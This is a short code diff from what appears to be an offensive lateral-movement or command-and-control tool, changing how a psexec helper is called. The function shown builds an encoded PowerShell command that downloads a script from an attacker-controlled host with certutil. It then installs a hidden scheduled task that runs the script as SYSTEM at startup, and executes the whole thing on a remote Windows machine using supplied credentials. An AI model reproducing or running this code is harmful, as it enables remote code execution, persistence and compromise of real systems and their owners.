@@ -11,7 +11,7 @@ def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
     rnum = random.randint(1, 1000)
     cmd = f'certutil.exe -f -split -urlcache http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1 C:\\programdata\\win.ps1; schtasks /create /tn "agent{rnum}" /tr "powershell -nop -w hidden C:\\Programdata\\win.ps1" /sc onstart /ru system /rl highest /f; schtasks /run /tn "agent{rnum}"'
     b64 = base64.b64encode(cmd.encode("utf-16")[2:]).decode("utf-8")
-    os_cmd = f"/usr/bin/impacket-psexec {username}'{password}'@{target} 'powershell -e {b64}'"
+    os_cmd = f"python3 venv/bin/psexec.py {username}'{password}'@{target} 'powershell -e {b64}'"
     print(os_cmd)
     os.system(os_cmd)
 
